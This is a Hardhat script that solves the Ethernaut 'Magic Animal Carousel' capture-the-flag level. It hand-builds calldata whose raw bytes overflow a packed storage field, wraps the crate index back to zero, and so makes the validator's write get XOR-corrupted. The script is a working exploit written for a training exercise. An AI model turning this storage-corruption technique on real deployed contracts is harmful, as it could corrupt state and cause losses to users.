import { ethers } from "hardhat";

/**
 * Ethernaut Level 33: Magic Animal Carousel
 * 
 * VALIDATION checks: after setAnimalAndSpin("Goat"), is stored animal != expected?
 * 
 * EXPLOIT: Make validation's setAnimalAndSpin write to a crate with existing data!
 * The XOR will corrupt the animal, making it different from expected.
 * 
 * Steps:
 * 1. changeAnimal on crate 0 with 12-byte name → sets nextId to 65533 + adds animal
 * 2. setAnimalAndSpin → goes to crate 65533, nextId = 65534
 * 3. setAnimalAndSpin → goes to crate 65534, nextId = 0 (loops back!)
 * 4. Validation's setAnimalAndSpin → writes to crate 0, XOR with existing = CORRUPTED!
 */

const OWNER_MASK = (1n << 160n) - 1n;

function decodeCrate(crateValue: bigint) {
  const owner = "0x" + (crateValue & OWNER_MASK).toString(16).padStart(40, '0');
  const nextId = (crateValue >> 160n) & 0xFFFFn;
  const animalBits = crateValue >> 176n;
  return { owner, nextId, animalBits };
}

// Build raw calldata to bypass UTF-8 encoding  
function buildChangeAnimalCalldata(animalBytes: number[], crateId: number): string {
  // Compute selector: keccak256("changeAnimal(string,uint256)")[:4]
  const selector = ethers.id("changeAnimal(string,uint256)").slice(0, 10);
  
  // Build hex strings
  const offset = "0000000000000000000000000000000000000000000000000000000000000040"; // 64
  const crateIdPadded = crateId.toString(16).padStart(64, '0');
  const lengthPadded = animalBytes.length.toString(16).padStart(64, '0');
  
  // Animal bytes padded to 32 bytes
  let animalPadded = "";
  for (const b of animalBytes) {
    animalPadded += b.toString(16).padStart(2, '0');
  }
  animalPadded = animalPadded.padEnd(64, '0');
  
  return selector + offset + crateIdPadded + lengthPadded + animalPadded;
}

async function main() {
  console.log("=== Ethernaut Level 33: Magic Animal Carousel ===\n");
  
  const [signer] = await ethers.getSigners();
  console.log(`Attacker: ${signer.address}\n`);
  
  const carouselAddress = process.env.CAROUSEL_ADDRESS;
  if (!carouselAddress) throw new Error("Set CAROUSEL_ADDRESS");
  
  console.log(`Target: ${carouselAddress}\n`);
  
  const carousel = await ethers.getContractAt("MagicAnimalCarousel", carouselAddress);
  
  // Initial state
  console.log("=== Initial State ===");
  let crate0 = await carousel.carousel(0);
  let crate0Dec = decodeCrate(crate0);
  console.log(`Crate 0: nextId=${crate0Dec.nextId}, animal=0x${crate0Dec.animalBits.toString(16)}`);
  console.log(`currentCrateId: ${await carousel.currentCrateId()}`);
  
  console.log("\n=== EXPLOIT: Setup XOR trap for validation ===\n");
  
  // Step 1: changeAnimal on crate 0 with raw bytes to set nextId = 65533
  // Bytes: 10 A's + 0xFF + 0xFC = low 16 bits = 0xFFFC
  // 1 | 0xFFFC = 0xFFFD = 65533
  console.log("Step 1: Set crate 0's nextId to 65533 via raw bytes...");
  const animalBytes = [0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41, 0xFF, 0xFC];
  const calldata = buildChangeAnimalCalldata(animalBytes, 0);
  
  const tx1 = await signer.sendTransaction({
    to: carouselAddress,
    data: calldata,
    gasLimit: 200000
  });
  console.log(`Tx1: ${tx1.hash}`);
  await tx1.wait();
  
  crate0 = await carousel.carousel(0);
  crate0Dec = decodeCrate(crate0);
  console.log(`✅ Crate 0: nextId=${crate0Dec.nextId}, animal=0x${crate0Dec.animalBits.toString(16)}`);
  
  // Step 2: setAnimalAndSpin → goes to crate 65533
  console.log("\nStep 2: setAnimalAndSpin → crate 65533...");
  const tx2 = await carousel.setAnimalAndSpin("Test");
  console.log(`Tx2: ${tx2.hash}`);
  await tx2.wait();
  
  let currentId = await carousel.currentCrateId();
  console.log(`✅ currentCrateId: ${currentId}`);
  
  const crate65533 = await carousel.carousel(65533);
  console.log(`   Crate 65533 nextId: ${decodeCrate(crate65533).nextId} (should be 65534)`);
  
  // Step 3: setAnimalAndSpin → goes to crate 65534
  console.log("\nStep 3: setAnimalAndSpin → crate 65534...");
  const tx3 = await carousel.setAnimalAndSpin("Test");
  console.log(`Tx3: ${tx3.hash}`);
  await tx3.wait();
  
  currentId = await carousel.currentCrateId();
  console.log(`✅ currentCrateId: ${currentId}`);
  
  const crate65534 = await carousel.carousel(65534);
  const crate65534Dec = decodeCrate(crate65534);
  console.log(`   Crate 65534 nextId: ${crate65534Dec.nextId} (should be 0 - LOOPS BACK!)`);
  
  // Verify crate 0 still has animal data for XOR trap
  crate0 = await carousel.carousel(0);
  crate0Dec = decodeCrate(crate0);
  console.log(`\n   Crate 0 animal (XOR trap): 0x${crate0Dec.animalBits.toString(16)}`);
  
  console.log("\n=== READY! ===");
  console.log("When validation calls setAnimalAndSpin('Goat'):");
  console.log("  - It reads nextId=0 from crate 65534");
  console.log("  - It writes to crate 0 (which has our animal data!)");
  console.log("  - XOR corrupts the stored 'Goat' → validation passes!");
  
  console.log("\n🎯 Submit your instance on Ethernaut NOW!");
}

main().catch((e) => { console.error(e); process.exitCode = 1; });
